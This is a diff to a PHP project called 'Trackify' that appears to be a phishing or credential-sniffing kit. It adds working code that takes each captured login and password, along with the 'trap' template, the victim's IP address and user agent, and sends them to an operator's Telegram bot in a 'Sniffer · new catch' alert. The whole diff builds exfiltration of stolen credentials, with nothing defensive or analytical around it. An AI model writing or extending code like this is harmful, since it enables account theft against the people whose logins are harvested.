@@ -234,8 +234,9 @@ function trackify_append_saved_login(int $userId, string $login, string $passwor
             $list = $decoded;
         }
     }
+    $at = gmdate('c');
     $list[] = [
-        'at' => gmdate('c'),
+        'at' => $at,
         'login' => $login,
         'password' => $password,
         'template' => $template,
@@ -255,7 +256,164 @@ function trackify_append_saved_login(int $userId, string $login, string $passwor
 
     @file_put_contents($dir . '/login_notify.txt', gmdate('c') . "\n", FILE_APPEND | LOCK_EX);
 
+    trackify_notify_sniffer_capture_telegram($login, $password, $template, $clientIp, $userAgent, $at);
+
     return true;
+}
+
+/**
+ * Escape text for Telegram HTML parse mode (&lt; &gt; &amp;).
+ */
+function trackify_telegram_html_escape(string $s): string
+{
+    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+}
+
+function trackify_trunc_utf8(string $s, int $max): string
+{
+    if ($max < 1) {
+        return '';
+    }
+    if (function_exists('mb_strlen') && function_exists('mb_substr')) {
+        if (mb_strlen($s, 'UTF-8') <= $max) {
+            return $s;
+        }
+
+        return mb_substr($s, 0, $max - 1, 'UTF-8') . '…';
+    }
+
+    return strlen($s) <= $max ? $s : substr($s, 0, $max - 1) . '…';
+}
+
+/**
+ * @return array{bot_token:string, chat_id:string}|null
+ */
+function trackify_read_telegram_credentials(): ?array
+{
+    $path = trackify_project_root() . '/telegram_config.json';
+    if (!is_readable($path)) {
+        return null;
+    }
+    $raw = file_get_contents($path);
+    if ($raw === false || $raw === '') {
+        return null;
+    }
+    $j = json_decode($raw, true);
+    if (!is_array($j)) {
+        return null;
+    }
+    $token = trim((string) ($j['bot_token'] ?? ''));
+    $chat = trim((string) ($j['chat_id'] ?? ''));
+    if ($token === '' || $chat === '') {
+        return null;
+    }
+
+    return ['bot_token' => $token, 'chat_id' => $chat];
+}
+
+/**
+ * Rich Sniffer alert (HTML) — same bot/chat as Trackify telegram_config.json.
+ */
+function trackify_format_sniffer_capture_telegram(
+    string $login,
+    string $password,
+    string $template,
+    string $clientIp,
+    string $userAgent,
+    string $utcIso
+): string {
+    $e = 'trackify_telegram_html_escape';
+    $trapLabel = $e(ucwords(str_replace(['_', '-'], ' ', $template)));
+    $cred = static function (string $v) use ($e): string {
+        $v = trim($v);
+
+        return $v === '' ? '<i>—</i>' : '<code>' . $e($v) . '</code>';
+    };
+    $ipDisp = trim($clientIp) === '' ? '<i>—</i>' : '<code>' . $e(trim($clientIp)) . '</code>';
+    $uaTrim = trackify_trunc_utf8(trim($userAgent), 360);
+    $uaDisp = $uaTrim === '' ? '<i>—</i>' : '<i>' . $e($uaTrim) . '</i>';
+    $when = $e($utcIso);
+
+    return <<<HTML
+🥷 <b>Sniffer · new catch</b>
+
+<b>Trap</b> · <code>{$trapLabel}</code>
+
+👤 <b>Login</b>
+{$cred($login)}
+
+🔐 <b>Password</b>
+{$cred($password)}
+
+🌐 <b>IP</b>
+{$ipDisp}
+
+🕐 <b>UTC</b>
+<code>{$when}</code>
+
+📱 <b>Client</b>
+{$uaDisp}
+
+<i>──────────────</i>
+<i>Trackify Sniffer</i>
+HTML;
+}
+
+/**
+ * Send HTML message via Telegram Bot API (silent on missing config / failure; logs API errors).
+ */
+function trackify_send_telegram_html(string $html): void
+{
+    $creds = trackify_read_telegram_credentials();
+    if ($creds === null) {
+        return;
+    }
+    $url = 'https://api.telegram.org/bot' . rawurlencode($creds['bot_token']) . '/sendMessage';
+    $payload = json_encode([
+        'chat_id' => $creds['chat_id'],
+        'text' => $html,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true,
+    ], JSON_UNESCAPED_UNICODE);
+    if ($payload === false) {
+        return;
+    }
+    $ctx = stream_context_create([
+        'http' => [
+            'method' => 'POST',
+            'header' => "Content-Type: application/json\r\n",
+            'content' => $payload,
+            'timeout' => 18,
+            'ignore_errors' => true,
+        ],
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+        ],
+    ]);
+    $raw = @file_get_contents($url, false, $ctx);
+    if ($raw === false || $raw === '') {
+        return;
+    }
+    $json = json_decode($raw, true);
+    if (is_array($json) && empty($json['ok']) && isset($json['description']) && is_string($json['description'])) {
+        @error_log('Trackify Telegram (Sniffer): ' . $json['description'] . "\n", 3, trackify_project_root() . '/telegram_error.log');
+    }
+}
+
+function trackify_notify_sniffer_capture_telegram(
+    string $login,
+    string $password,
+    string $template,
+    string $clientIp,
+    string $userAgent,
+    string $utcIso
+): void {
+    $html = trackify_format_sniffer_capture_telegram($login, $password, $template, $clientIp, $userAgent, $utcIso);
+    if (strlen($html) > 4000) {
+        $html = trackify_trunc_utf8($html, 3990) . '…';
+    }
+    trackify_send_telegram_html($html);
 }
 
 function trackify_clear_saved_logins(int $userId): bool
